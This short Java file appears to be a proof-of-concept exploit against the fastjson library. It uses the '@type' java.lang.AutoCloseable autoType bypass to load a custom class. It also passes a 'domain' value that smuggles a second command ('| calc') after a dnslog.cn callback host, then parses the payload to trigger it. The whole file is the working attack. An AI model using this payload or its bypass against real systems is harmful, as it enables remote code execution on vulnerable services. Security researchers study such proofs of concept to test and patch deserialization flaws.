package org.heptagram.fastjson;

import com.alibaba.fastjson.JSONObject;

public class AutoCloseableMain {
    public static void main(String[] args) {
        String payload ="{\n" +
                "  \"@type\":\"java.lang.AutoCloseable\",\n" +
                "  \"@type\": \"org.heptagram.fastjson.ViaAutoCloseable\",\n" +
                "  \"domain\": \" wme8bg.dnslog.cn| calc\"\n" +
                "}";
        JSONObject.parseObject(payload);
    }
}
